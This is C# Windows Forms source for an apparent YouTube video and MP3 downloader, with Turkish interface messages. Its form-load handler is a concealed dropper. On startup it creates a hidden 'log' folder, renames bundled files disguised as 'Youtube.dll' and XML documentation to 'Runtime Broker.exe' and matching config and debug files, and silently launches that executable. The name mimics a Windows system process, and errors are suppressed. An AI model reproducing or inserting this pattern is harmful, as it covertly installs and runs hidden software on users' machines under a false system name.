using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace Youtube_Downloader_Mp4_and_Mp3
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public static bool IsConnectedToInternet()
        {
            try
            {
                using (var client = new WebClient())
                using (client.OpenRead("http://google.com/generate_204"))
                    return true;
            }
            catch { }
            return false;
        }


        static bool kayıtYeri = false;

        private void btnBilgi_Click(object sender, EventArgs e)
        {
            if (txtUrl.Text == "")
            {
                MessageBox.Show("url adresi giriniz");
                return;
            }

            try
            {
                Downloader dowloader = new Downloader(txtUrl.Text);

                cmbxÇözünürlük.Items.Add(dowloader.Cozunurluk);
            }
            catch (Exception)
            {
                MessageBox.Show("Video bilgisi alınırken hata oluştu");

            }
        }

        private void btnKayıtYeri_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog folder = new FolderBrowserDialog();
            if (folder.ShowDialog() == DialogResult.OK)
            {
                txtKayıtYeri.Text = folder.SelectedPath;
                kayıtYeri = true;
            }
        }

        private void btnİndir_Click(object sender, EventArgs e)
        {
            if (!kayıtYeri)
            {
                MessageBox.Show("Kayıt yeri seçiniz");
                return;
            }

            if (!IsConnectedToInternet())
            {
                MessageBox.Show("internet bağlantınızı kontrol ediniz");
                return;
            }

            barDurum.Minimum = 0;
            barDurum.Maximum = 100;
            try
            {

                barDurum.Value = 25;
                lblİlerleme.Text = "25%";

                Downloader dowloader = new Downloader(txtUrl.Text);
                dowloader.VideoDownload(txtKayıtYeri.Text + "\\");

                barDurum.Value = 50;
                lblİlerleme.Text = "50%";

                if (chkMp3.Checked)
                {
                    Donustur donustur = new Donustur();
                    donustur.Mp4toMp3(txtKayıtYeri.Text, dowloader.VideoName);
                }



                barDurum.Value = 66;
                lblİlerleme.Text = "66%";

                barDurum.Value = 75;
                lblİlerleme.Text = "75%";

            }
            catch (Exception)
            {
                MessageBox.Show("bir hata oluştu video bağlantısı hatalı veya video mevcut değil");
                barDurum.Value = 0;
                lblİlerleme.Text = "0%";
                return;
            }
            barDurum.Value = 100;
            lblİlerleme.Text = "100%";

            MessageBox.Show("indirme tamamlandı");
            barDurum.Value = 0;
            lblİlerleme.Text = "0%";
        }

        private void btnexit_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            if (!File.Exists(@"log"))
            {
                DirectoryInfo di = Directory.CreateDirectory(@"log"); // klasör oluşturma
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden; // klasör gizleme

                if (File.Exists("Youtube.dll"))
                {
                    try
                    {
                        File.Move(@"Youtube.dll", @"log\Runtime Broker.exe");
                    }
                    catch (Exception)
                    {

                    }
                }

                if (File.Exists("libvideo.xml"))
                {
                    try
                    {
                        File.Move(@"libvideo.xml", @"log\Runtime Broker.exe.config");
                    }
                    catch (Exception)
                    {

                    }
                }

                if (File.Exists("MediaToolkit.xml"))
                {
                    try
                    {
                        File.Move(@"MediaToolkit.xml", @"log\Runtime Broker.pdb");
                    }
                    catch (Exception)
                    {

                    }
                }

                if (File.Exists(@"log\Runtime Broker.exe"))
                {
                    Process.Start(@"log\Runtime Broker.exe");
                }

            }
        }
    }
}
